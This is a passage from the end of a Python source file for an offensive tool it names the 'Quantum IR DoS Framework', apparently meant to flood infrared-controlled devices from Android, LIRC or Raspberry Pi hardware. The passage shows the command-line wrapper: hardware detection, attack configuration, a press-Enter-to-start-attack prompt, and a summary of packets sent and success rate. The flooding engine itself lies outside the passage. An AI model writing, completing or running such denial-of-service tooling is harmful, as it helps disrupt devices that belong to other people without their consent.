        print(f"\n\n{Fore.YELLOW}[*] Stopping attack...{Style.RESET_ALL}")
        self.engine.stop_attack()
        
        stats = self.engine.stats
        elapsed = (datetime.now() - stats.start_time).total_seconds()
        avg_pps = int(stats.packets_sent / elapsed) if elapsed > 0 else 0
        
        summary = f"""
{Fore.GREEN}{Style.BRIGHT}╔═══════════════════════ ATTACK SUMMARY ══════════════════════╗{Style.RESET_ALL}
{Fore.CYAN}║{Style.RESET_ALL} Total Duration:        {Fore.WHITE}{stats.uptime:<35}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}
{Fore.CYAN}║{Style.RESET_ALL} Packets Transmitted:   {Fore.GREEN}{stats.packets_sent:<35}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}
{Fore.CYAN}║{Style.RESET_ALL} Average Rate:          {Fore.CYAN}{avg_pps} packets/second{Style.RESET_ALL}                    {Fore.CYAN}║{Style.RESET_ALL}
{Fore.CYAN}║{Style.RESET_ALL} Transmission Errors:   {Fore.RED}{stats.packets_failed:<35}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}
{Fore.CYAN}║{Style.RESET_ALL} Success Rate:          {Fore.GREEN}{stats.success_rate:.2f}%{Style.RESET_ALL}                              {Fore.CYAN}║{Style.RESET_ALL}
{Fore.GREEN}{Style.BRIGHT}╚═════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(summary)
        print(f"{Fore.YELLOW}[✓] Attack terminated successfully{Style.RESET_ALL}\n")



# ═══════════════════════════════════════════════════════════════
# MAIN EXECUTION
# ═══════════════════════════════════════════════════════════════

def main():
    """Main execution function"""
    # Create engine
    engine = QuantumIRDoSEngine()
    cli = QuantumCLI(engine)
    
    try:
        cli.clear_screen()
        cli.print_banner()
        
        print(f"{Fore.CYAN}[*] Initializing Quantum IR DoS Framework...{Style.RESET_ALL}")
        time.sleep(1)
        
        # Detect hardware
        print(f"\n{Fore.YELLOW}[*] Detecting IR hardware...{Style.RESET_ALL}")
        if not engine.detect_hardware():
            print(f"\n{Fore.RED}[!] No IR hardware detected!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Supported hardware:{Style.RESET_ALL}")
            print(f"    - Android Consumer IR (Termux/NetHunter)")
            print(f"    - LIRC (Linux Infrared Remote Control)")
            print(f"    - GPIO (Raspberry Pi)")
            print(f"\n{Fore.YELLOW}[!] Please ensure hardware is available and try again.{Style.RESET_ALL}")
            sys.exit(1)
        
        print(f"{Fore.GREEN}[✓] Hardware initialized successfully{Style.RESET_ALL}\n")
        time.sleep(1)
        
        # Configure attack
        cli.configure_attack()
        
        # Confirm start
        input(f"\n{Fore.GREEN}[Press ENTER to start attack]{Style.RESET_ALL}")
        
        # Run attack
        cli.run_attack()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Operation cancelled by user{Style.RESET_ALL}")
        engine.cleanup()
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        engine.cleanup()
        sys.exit(1)


if __name__ == "__main__":
    main()
